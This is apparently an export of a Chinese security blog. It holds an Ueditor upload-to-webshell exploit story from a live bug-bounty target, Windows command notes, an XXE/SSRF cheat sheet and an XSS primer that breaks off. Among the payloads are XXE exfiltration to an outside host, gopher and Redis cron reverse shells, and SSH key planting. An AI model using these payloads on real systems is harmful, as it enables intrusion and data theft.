<p>注意：mssql账号为sa</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>IIS</tag>
      </tags>
  </entry>
  <entry>
    <title>Ueditor漏洞复现</title>
    <url>/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>闲来无事，逛逛补天。随机选取一个不要钱的幸运儿，fofa资产收集，发现一个域名下，存在目录遍历漏洞。emmm，暴露无遗呀，不拿下简直对不起这个遍历漏洞。众多备份文件，嗯，不会逆向源码，放过；一个上传入口，一个传了没执行权限，一个接口错误，一个不记得了。。。年龄大了，一晚上过去就忘记了，嘤嘤嘤。好了，继续，发现一个usditor编辑器，百度一波，其实是百度的ueditor富文本编辑器。现学现卖，开始。</p>
<p><img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730085813949.png" alt="image-20210730085813949" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730085813949.png" class="lozad post-image"></p>
<h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><p>1、发现存在ueditor文本编辑器</p>
<p> <img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151403335.png" alt="image-20210810151403335" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151403335.png" class="lozad post-image"></p>
<p>2、漏洞探测</p>
<p>访问url</p>
<pre class="highlight"><span class="line">/usditor/net/controller.ashx?action=catchimage</span><br></pre>

<p>返回</p>
<pre class="highlight"><span class="line">&#123;&quot;state&quot;:&quot;参数错误：没有指定抓取源&quot;&#125;</span><br></pre>

<p>说明存在编辑器文件上传漏洞。</p>
<p><img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090222390.png" alt="image-20210730090222390" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090222390.png" class="lozad post-image"></p>
<p>3、构造上传入口</p>
<pre class="highlight"><span class="line">&lt;form action=&quot;xx/usditor/net/controller.ashx?action=catchimage&quot; enctype=&quot;application/x-www-form-urlencoded&quot;  method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p &gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre>

<p>注：action的通用地址应为：</p>
<pre class="highlight"><span class="line">http://xxx.com/ueditor/net/controller.ashx?action=catchimage</span><br></pre>

<p><img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151430644.png" alt="image-20210810151430644" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151430644.png" class="lozad post-image"></p>
<p>4、上传公网服务器aspx图片马，并用<code>?.aspx</code>连接，即<code>http://x/x.jpg?.aspx</code></p>
<p><img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151439843.png" alt="image-20210810151439843" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151439843.png" class="lozad post-image"></p>
<p>注：必须为公网服务器</p>
<p>5、返回图片马路径</p>
<p>应为<code>/usditor/net/upload/image/20210729/6376...09895.aspx</code></p>
<p><img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090908140.png" alt="image-20210730090908140" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730090908140.png" class="lozad post-image"></p>
<p>6、蚁剑连接，getshell</p>
<p> <img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151458628.png" alt="image-20210810151458628" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151458628.png" class="lozad post-image"></p>
<h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>这里补充下上传拦截规则，前面提到，发现过其他上传入口，也上传过aspx图片马，这里只做了Content-Type，即文件类型检测。编辑器这里也一样。对于文件上传漏洞来说，没什么难度，对于Ueditor编辑器漏洞来说，这里还有几个坑点。</p>
<p>1、服务器必须为国内公网服务器，不然会上传失败。</p>
<p>2、返回的路径<code>/upload/image/20210729/6376...09895.aspx</code>为当前目录下的路径，即<code>/usditor/net/upload/image/20210729/6376...09895.aspx</code>,前面如有路径都应加上，而不是根目录下的upload路径。</p>
<p>3、到这里忽然想起来，第三个上传点，当时传上去了，但是没有找到路径，就没有继续做，没想到传到这里来了<img src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151516892.png" alt="image-20210810151516892" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210810151516892.png" class="lozad post-image"></p>
<p>哦对，根目录下发现一个K8脱库大马，尝试密码K8team成功进入，然后顺手提交了挂马漏洞。嗯，作为一名白帽子，一定要从入门开始养成习惯。</p>
<p> <img src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730092037287.png" alt="image-20210730092037287" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/Ueditor%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210730092037287.png" class="lozad post-image"></p>
<p>————————————————————————————————————————————————————————————</p>
<p>嗯，洞没过，大意了。补天先过了挂马洞，编辑器洞来回折腾了几天。然后，编辑器洞和挂马洞一起被修了，提交失败。害~利人不利己。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Ueditor</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows随记</title>
    <url>/article/Windows%E9%9A%8F%E8%AE%B0/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">netstat -r</td>
<td align="left">列出当前路由信息</td>
</tr>
<tr>
<td align="left">dir</td>
<td align="left">显示文件列表，同linux下ls</td>
</tr>
<tr>
<td align="left">mkdir或mk</td>
<td align="left">创建目录</td>
</tr>
<tr>
<td align="left">rmdir或rd</td>
<td align="left">删除目录</td>
</tr>
<tr>
<td align="left">copy</td>
<td align="left">复制，需要指定目录</td>
</tr>
<tr>
<td align="left">del</td>
<td align="left">删除</td>
</tr>
<tr>
<td align="left">touch</td>
<td align="left">创建文件</td>
</tr>
<tr>
<td align="left">ren</td>
<td align="left">重命名</td>
</tr>
<tr>
<td align="left">type</td>
<td align="left">查看文本文件</td>
</tr>
</tbody></table>
<p>文件查找</p>
<pre class="highlight"><span class="line">for /r c:/ %i in (*.png) do @echo %i		#搜索C盘下包含png后缀的文件</span><br><span class="line">for /r c:/ %i in (*user*) do @echo %i		#搜索C盘下包含user关键词的文件</span><br></pre>

<p>choco安装</p>
<p>检查</p>
<pre class="highlight"><span class="line">Get-ExecutionPolicy</span><br></pre>

<p>如果返回的是 <code>Restricted</code>，那么需要更改为<code>Bypass</code>或<code>AllSigned</code></p>
<p>修改</p>
<pre class="highlight"><span class="line">Set-ExecutionPolicy AllSigned</span><br><span class="line">或</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br></pre>

<p>安装</p>
<pre class="highlight"><span class="line">Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString(&#x27;https://chocolatey.org/install.ps1&#x27;))</span><br></pre>

<p><strong>修改安装路径</strong></p>
<p>打开注册表<code>regedit</code></p>
<p>修改</p>
<pre class="highlight"><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion</span><br></pre>

<p>中的<code>ProgramFilesDir</code>和<code>ProgramFilesDir (x86)</code>的值为指定路径</p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>随记</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE和SSRF</title>
    <url>/article/XXE%E5%92%8CSSRF/</url>
    <content><![CDATA[<p>XML是可拓展标识语言的简写；功能是传输数据，不是显示数据；</p>
<table>
<thead>
<tr>
<th align="left">说明</th>
<th align="left">语句</th>
</tr>
</thead>
<tbody><tr>
<td align="left">数据格式</td>
<td align="left"><code>Content-Type: application/xml</code><br><code>Content-Length: 9</code><br><code> </code><br><code>&lt;data&gt;</code><br><code>&lt;name&gt;zs&lt;/name&gt;</code><br><code>&lt;pass&gt;123&lt;/pass&gt;</code><br><code>&lt;/data&gt;</code></td>
</tr>
<tr>
<td align="left">语法结构 <br>一部分是标签的定义， 一部分是标签的解释，标签的解释也称为DTD</td>
<td align="left"><code>&lt;?xml version=&quot;1.1&quot; encode=&quot;utf-8&quot;&gt;  //标识</code><br><code> </code><br><code>&lt;!DOCTYPE data[  //普通实体，内部声明</code><br><code>&lt;!ENTITY name SYSTEM &quot;http://ip:port或者http://dnslog.cn&quot;&gt; //无回显，判断SYSTEM是否可用</code><br><code>&lt;!ENTITY pass SYSTEM &quot;/etc/passwd&quot;&gt;//本地文件读取</code><br><code>&lt;!ENTITY %test SYSTEM &quot;http://ip/dtd文件位置&quot;&gt; %test;//远程文件读取</code><br><code>]&gt;</code><br><code> </code><br><code>(需要修改底下数据为变量：&amp;name;)</code><br><code>//标签+数据</code><br><code>&lt;data&gt;</code><br><code>&lt;name&gt;zs&lt;/name&gt;</code><br><code>&lt;pass&gt;123&lt;/pass&gt;</code><br><code>&lt;/data&gt;</code><br><br>读文件可使用伪协议</td>
</tr>
<tr>
<td align="left">利用</td>
<td align="left">读文件<br> <code>file:///etc/passwd</code>  <br><br>远程端口探测（内网） <br><code>http://ip:port/test/ </code><br><br>命令执行（前提：php安装expect扩展） <br>expect://系统命令</td>
</tr>
<tr>
<td align="left">数据外带</td>
<td align="left">本地服务器文件  <br><code>&lt;!ENTITY % data SYSTEM &quot;php://filter/read=convert.base64-encode/resource=doLogin.php&quot;&gt;</code><br><code>&lt;!ENTITY % xxe &quot;&lt;!ENTITY send SYSTEM &#39;http://172.16.12.184:9000/?data=%data;&#39;&gt;&quot;&gt;</code><br><code>%xxe;</code><br><code> </code><br><code>发送文件&lt;br/&gt; </code><br><code>&lt;!DOCTYPE user[</code><br><code>&lt;!ENTITY % load SYSTEM &quot;http://172.16.12.184:9000/xxe.dtd&quot;&gt;</code><br><code>%load;</code><br><code>]&gt;</code><br><code>&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;pass&lt;/password&gt;&lt;/user&gt;</code></td>
</tr>
</tbody></table>
<p>各类语言支持的协议：</p>
<table>
<thead>
<tr>
<th align="left">libxml2</th>
<th align="left">PHP</th>
<th align="left">Java</th>
<th align="left">.NET</th>
</tr>
</thead>
<tbody><tr>
<td align="left">file</td>
<td align="left">file</td>
<td align="left">http</td>
<td align="left">file</td>
</tr>
<tr>
<td align="left">ftp</td>
<td align="left">http</td>
<td align="left">https</td>
<td align="left">http</td>
</tr>
<tr>
<td align="left">http</td>
<td align="left">ftp</td>
<td align="left">ftp</td>
<td align="left">https</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">php</td>
<td align="left">file</td>
<td align="left">ftp</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">compress.zlib</td>
<td align="left">jar</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"></td>
<td align="left">compress.bzlip2</td>
<td align="left">netdoc</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"></td>
<td align="left">data</td>
<td align="left">mailto</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"></td>
<td align="left">glob</td>
<td align="left">gopher*</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"></td>
<td align="left">phar</td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p><strong>概述：</strong></p>
<p>XML实体：XML语言的变量，和PHP、JSP、C语言变量一样，有变量名（实体名）、变量值（实体的值）,可以通过&amp;/%引用</p>
<p>XML实体类型：普通实体和参数实体，用下表总结两种实体类型：</p>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">普通实体</th>
<th align="left">参数实体</th>
</tr>
</thead>
<tbody><tr>
<td align="left">使用场合用</td>
<td align="left">在xml文档中</td>
<td align="left">用在DTD文档中</td>
</tr>
<tr>
<td align="left">声明内部</td>
<td align="left"><code>&lt;!ENTITYentityName”entityValue”&gt;</code></td>
<td align="left"><code>&lt;!ENTITY % entityName&quot;entityValue&quot;&gt;</code></td>
</tr>
<tr>
<td align="left">外部</td>
<td align="left"><code>&lt;!ENTITYentityNameSYSTEM”外部文件url地址”&gt;</code></td>
<td align="left"><code>&lt;!ENTITY%entityNameSYSTEM”外部文件url地址”&gt;</code></td>
</tr>
<tr>
<td align="left">引用方式</td>
<td align="left">&name;</td>
<td align="left">%name;声明时中间有空格，引用时没空格</td>
</tr>
</tbody></table>
<p><strong>XXE漏洞原理</strong></p>
<p>概述</p>
<p>XXE漏洞也叫XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件</p>
<p>漏洞的产生</p>
<p>对上传的xml文件没有进行过滤，导致可上传恶意xml文件</p>
<p><strong>漏洞的危害</strong></p>
<p>1、读取任意文件</p>
<p>2、执行系统命令</p>
<p>3、内网端口扫描</p>
<p>4、攻击内网其他网站</p>
<p><strong>漏洞的防御与修复</strong></p>
<p>禁止使用外部实体，例如ibxml_disable_entity_</p>
<p>loader(true)</p>
<p>过滤用户提交的XML数据，防止出现非法内容</p>
<p>XXEinjector.rb使用</p>
<table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">启动</td>
<td align="left"><code>ruby ./XXEinjector.rb</code></td>
</tr>
<tr>
<td align="left">使用</td>
<td align="left">抓取xxe数据包，在data上面加入大写的XXEINJECT 数据外带 <br><code>ruby XXEinjector.rb –file=D:\x.txt –path=/etc/my.cnf –host=172.16.12.182 –httpport=9999 –phpfilter –verbose –oob=http</code></td>
</tr>
</tbody></table>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF（Server-sideRequestForge,服务端请求伪造）是一种由攻击者构造形成由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。主要用来探测内网信息</p>
<p><strong>存在漏洞的位置：</strong></p>
<p>1、分享：通过URL地址分享网页内容</p>
<p>2、转码服务</p>
<p>3、在线翻译</p>
<p>4、图片加载与下载：通过URL地址加载或下载图片</p>
<p>5、图片、文章收藏功能</p>
<p>6、未公开的api实现以及其他调用URL的功能</p>
<p>7、从URL关键字中寻找</p>
<p><strong>SSRF漏洞危害</strong></p>
<p>端口扫描</p>
<p>内网Web应用指纹识别</p>
<p>攻击内网Web应用</p>
<p>读取本地文件</p>
<p><strong>SSRF漏洞防御与修复</strong></p>
<p>限制请求的端口只能为web端口，只允许访问HTTP和HTTPS的请求</p>
<p>设置白名单，或限制内网IP，以防止对内网进行攻击</p>
<p>禁止30x跳转</p>
<p>屏蔽返回的详细信息</p>
<p><strong>伪协议读取</strong></p>
<table>
<thead>
<tr>
<th align="left">协议</th>
<th align="left">常见的payload</th>
</tr>
</thead>
<tbody><tr>
<td align="left">file协议 <br>——读取文件</td>
<td align="left"><code>curl -v &#39;file:///etc/passwd&#39;</code></td>
</tr>
<tr>
<td align="left">dict协议<br> ——获取目标服务器端口上运行的服务版本等信息</td>
<td align="left"><code>curl -v &#39;dict://127.0.0.1:6379/info&#39;</code></td>
</tr>
<tr>
<td align="left">gopher协议<br>——反弹Shell</td>
<td align="left"><code>curl –v &#39;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1**** &#39; bash -i &gt;&amp; /dev/tcp/103.21.140.84/67890&gt;&amp;……&#39;</code></td>
</tr>
</tbody></table>
<p><strong>利用</strong></p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">获取正常文件</td>
<td align="left"><code>[http://ip/ssrf/?url=www.baidu.com/robots.txt]</code></td>
</tr>
<tr>
<td align="left">内网IP探测 <br><code>[http://x.x.x.x](http://x.x.x.x/) http://x.x.x.1/24</code></td>
<td align="left">输入内网IP，查看返回包，返回正确即存在SSRF。<br> 注：127.0.0.1 IP不能确定存在SSRF 10.x.x.x、172.16.x.x-172.31.x.x、192.168.x.x</td>
</tr>
<tr>
<td align="left">端口探测 <br><code>dict://x.x.x.x:80/ [gopher://x.x.x.x:80/_1](gopher://x.x.x.x:80/_1)</code></td>
<td align="left">当设置参数URL为内网地址时，则会泄露内网信息，比如内网的某个服务是否开放 <br>提交参数： ?url=探测的ip:1234(不存在的端口) <br>返回结果： 端口没有开放，页面报错  <br><br>提交参数： <a href="http://ip/ssrf/?url=%E6%8E%A2%E6%B5%8B%E7%9A%84ip:22(%E5%BC%80%E6%94%BE%E7%9A%84%E7%AB%AF%E5%8F%A3)">http://ip/ssrf/?url=探测的ip:22(开放的端口)</a> <br>返回结果： 端口开放，页面返回服务相关信息</td>
</tr>
<tr>
<td align="left">读取系统本地文件</td>
<td align="left">利用file协议可以任意读取系统本地文件 <br>提交参数：<br><code>?url=file://c:\windows\system32\drivers\etc\hosts</code></td>
</tr>
<tr>
<td align="left">内网Web应用指纹识别</td>
<td align="left">大多数web应用框架都有一些独特的文件和目录。通过这些文件可以识别出应用的类型，甚至详细的版本。 根据这些信息就可以针对性的搜集漏洞进行攻击。 <br>举例： <br>判断phpMyAdmin是否安装以及详细版本 <br>提交参数： <br><code>?url=http://ip/phpmyadmin/README</code></td>
</tr>
</tbody></table>
<p><strong>快速找到内网IP</strong></p>
<p>Linux/php或java</p>
<pre class="highlight"><span class="line">file://读网卡文件、DNS配置文件</span><br></pre>

<p>注：机房IP一般为静态IP</p>
<p><strong>命令：</strong></p>
<table>
<thead>
<tr>
<th align="left">语句</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">file:///etc/issue</td>
<td align="left">内容不显示系统类型，为redhat系列</td>
</tr>
<tr>
<td align="left">file:///etc/redhat-relese</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">file:///etc/udev/reules.d/70-persistent-net.rules</td>
<td align="left">centos6网卡名称</td>
</tr>
<tr>
<td align="left">file:///etc/resolv.conf</td>
<td align="left">dns位置</td>
</tr>
<tr>
<td align="left">file:///etc/sysconfig/network-scripts/ifcfg-eth0</td>
<td align="left">网卡信息</td>
</tr>
</tbody></table>
<p><strong>SSRF利用Redis</strong></p>
<pre class="highlight"><span class="line">url=dict://x.x.x.x:6379/keys+*</span><br></pre>

<p>Redis常用命令</p>
<table>
<thead>
<tr>
<th align="left">语句</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">flushall</td>
<td align="left">清空数据</td>
</tr>
<tr>
<td align="left">keys *</td>
<td align="left">查看数据</td>
</tr>
<tr>
<td align="left">set key value</td>
<td align="left">设置键值</td>
</tr>
<tr>
<td align="left">get key</td>
<td align="left">获取键的值</td>
</tr>
<tr>
<td align="left">config set dir /</td>
<td align="left">设置保存路径</td>
</tr>
<tr>
<td align="left">config set dbfilename xxx.php</td>
<td align="left">新建文件</td>
</tr>
<tr>
<td align="left">save</td>
<td align="left">保存</td>
</tr>
<tr>
<td align="left">crontab -e</td>
<td align="left">设置定时任务</td>
</tr>
</tbody></table>
<p>反弹shell</p>
<pre class="highlight"><span class="line">nc -lvnp 4444        # 攻击机开启监听</span><br></pre>

<p># 连接redis，写定时反弹shell</p>
<pre class="highlight"><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line"></span><br><span class="line">flushall</span><br><span class="line"></span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line"></span><br><span class="line">config set dbfilename root</span><br><span class="line"></span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.24.82/4444 0&gt;&amp;1\n\n&quot;        #每分钟执行一次反弹连接</span><br><span class="line"></span><br><span class="line">save</span><br></pre>

<p><strong>ssh登录</strong></p>
<table>
<thead>
<tr>
<th align="left">语句</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ssh-keygen -t rsa</td>
<td align="left">生成密钥</td>
</tr>
<tr>
<td align="left">(echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) &gt; key.txt</td>
<td align="left">写入公钥</td>
</tr>
<tr>
<td align="left">cat ./key.txt | redis-cli -h 192.168.24.79 -x set tide</td>
<td align="left">将公钥内容设置给redis变量（靶机ip）</td>
</tr>
<tr>
<td align="left">redis-cli -h 192.168.24.79</td>
<td align="left">连接</td>
</tr>
<tr>
<td align="left">config set dir /root/.ssh</td>
<td align="left">默认公私钥路径</td>
</tr>
<tr>
<td align="left">config set dbfilename authorized_keys</td>
<td align="left">写入authorized_keys</td>
</tr>
<tr>
<td align="left">save</td>
<td align="left">保存</td>
</tr>
</tbody></table>
<p><strong>命令执行</strong></p>
<p>主从复制，数据同步，从-&gt;主，写入.so拓展库，执行系统命令</p>
<pre class="highlight"><span class="line">脚本：redis-rogue-server</span><br><span class="line"></span><br><span class="line">命令：python redis-rogue-server.py --rhost=192.168.21.61 --rport=6379 --lhost=192.168.21.112 --lport=1111</span><br></pre>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>XXE</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS</title>
    <url>/article/XSS/</url>
    <content><![CDATA[<h1 id="一、XSS漏洞的概述"><a href="#一、XSS漏洞的概述" class="headerlink" title="一、XSS漏洞的概述"></a>一、XSS漏洞的概述</h1><p>漏洞的介绍</p>
<p>XSS又叫CSS(CrossSiteScript)，全称跨站脚本攻击。它指的是攻击者往Web页面或者URL里插入恶意JavaScript脚本代码，如果Web应用程序对于用户输入的内容没有过滤，那么当正常用户浏览该网页的时候，嵌入在Web页面里的恶意JavaScript脚本代码会被执行，从而达到恶意攻击正常用户的目的。</p>
<table>
<thead>
<tr>
<th align="left">漏洞的位置</th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">数据交互的地方</td>
<td align="left">1、get post cookies headers方法 <br>2、富文本编辑器 <br>3、各类标签插入和自定义</td>
</tr>
<tr>
<td align="left">数据输出的地方</td>
<td align="left">1、用户资料 <br>2、关键词、标签、说明</td>
</tr>
<tr>
<td align="left">漏洞前提</td>
<td align="left">1、可以控制的输入点 <br>2、输入能返回到前端页面上被浏览器当成脚本语言解释执行</td>
</tr>
</tbody></table>
<h1 id="二、XSS危害"><a href="#二、XSS危害" class="headerlink" title="二、XSS危害"></a>二、XSS危害</h1><p>窃取用户Cookie，冒充用户身份进入网站（常见）</p>
<p>键盘记录</p>
<p>客户端信息探查</p>
<p>XSS getshell</p>
<p>劫持用户会话，执行任意操作</p>
<p>刷流量，执行弹窗广告</p>
<p>传播蠕虫病毒</p>
<p>…..</p>
<h1 id="三、XSS检测"><a href="#三、XSS检测" class="headerlink" title="三、XSS检测"></a>三、XSS检测</h1><h2 id="1、手工检测XSS"><a href="#1、手工检测XSS" class="headerlink" title="1、手工检测XSS"></a>1、手工检测XSS</h2><p>使用手工检测XSS漏洞是否存在时，最重要考虑的是哪里有输入、输入的数据在什么地方输出。</p>
<p>1、可得知输出位置</p>
<p>输入一些敏感字符，例如<code>&lt;、&gt;、&quot;、&#39;、()</code>等，请求后查看HTML源码，看这些输入的字符是否被转义</p>
<p>2、无法得知输出位置</p>
<p>非常多的web应用程序源代码不对外公开，这时在测试XSS时就有可能无法得知输入数据到底在何处显示，比如，测试某留言板是否存在XSS，那么在留言之后，可能需要经过管理员的审核才能显示，这时无法得知输入的数据在后台管理页面处于什么状态</p>
<h2 id="2、自动检测XSS"><a href="#2、自动检测XSS" class="headerlink" title="2、自动检测XSS"></a>2、自动检测XSS</h2><p>APPSCAN、AWVS、BurpSuite等软件，都可以有效地检测XSS漏洞，但这类大型的漏扫工具除了检测XSS外，还会检测SQL注入、文件包含等漏洞，所以效率比较低。专业的XSS扫描工具可以更准确的扫描XSS漏洞，如：XSSER、XSSF。</p>
<p>工具与手动相结合，才能更好地检测XSS，比如：在扫描XSS时，很多扫描器一般无法检测非常规的XSS漏洞，因为在提交留言时可能需要短信验证，验证码填写等，这是工具无法做到的。</p>
<p>页面中js代码执行位置（4个–两个标签外、两个标签内）</p>
<table>
<thead>
<tr>
<th align="left">语句</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
<td align="left">script标签中执行 –标签外（如body中） 推荐（不用点击，直接触发）*</td>
</tr>
<tr>
<td align="left"><code>&lt;script src=&quot;x.js&quot;&gt;&lt;/script&gt;</code></td>
<td align="left">调用执行 –标签外</td>
</tr>
<tr>
<td align="left"><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;</code></td>
<td align="left">伪协议触发（javascript不可少）–标签内</td>
</tr>
<tr>
<td align="left"><code>&lt;p onclick=&quot;alert(1)&quot;&gt;&lt;/p&gt;</code></td>
<td align="left">事件触发 –标签内 *</td>
</tr>
</tbody></table>
<p><strong>HTML实体编码</strong></p>
<p>若实体编码，则不存在xss漏洞。常见&lt;&gt;分别为&lt;&gt;</p>
<p>注意：需要查看源码，不要用F12</p>
<p>1、标签中不显示其他标签</p>
<p>2、多个空格只显示一个，可用 代替空格显示。</p>
<p>以&amp;开头;结尾，中间放特殊字符的英文简写或16进制数字。</p>
<p><strong>分类</strong></p>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">存储区</th>
<th align="left">插入点</th>
</tr>
</thead>
<tbody><tr>
<td align="left">反射型 XSS</td>
<td align="left">URL</td>
<td align="left">HTML</td>
</tr>
<tr>
<td align="left">存储型 XSS</td>
<td align="left">后端数据库</td>
<td align="left">HTML</td>
</tr>
<tr>
<td align="left">DOM型 XSS</td>
<td align="left">后端数据库/前端存储/URL前端</td>
<td align="left">JavaScript</td>
</tr>
</tbody></table>
<h1 id="四、反射型XSS"><a href="#四、反射型XSS" class="headerlink" title="四、反射型XSS"></a>四、反射型XSS</h1><p><strong>概念：</strong></p>
<p>是非持久性、参数型的跨站脚本。反射型XSS的JS代码在Web应用的参数（变量）中，如搜索框的反射型XSS。</p>
<p><strong>存在位置</strong>：</p>
<p>常见于通过URL传递参数的功能，如网站搜索、跳转等。</p>
<p><strong>攻击手法：</strong></p>
<p>需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</p>
<p>反射型xss漏洞poc：</p>
<pre class="highlight"><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;（常用）</span><br><span class="line"></span><br><span class="line">&lt;script&gt;confirm(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;prompt(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre>

<h1 id="五、存储型XSS"><a href="#五、存储型XSS" class="headerlink" title="五、存储型XSS"></a>五、存储型XSS</h1><p><strong>概念：</strong></p>
<p>持久性跨站脚本，是三种XSS中危害最大的。它是将恶意代码写进数据库或文件等可以永久保存数据的介质中。</p>
<p><strong>存在位置：</strong></p>
<p>常出现在留言板、发表评论或发表文章的地方(数据写入的地方)。</p>
<p><strong>攻击手法：</strong></p>
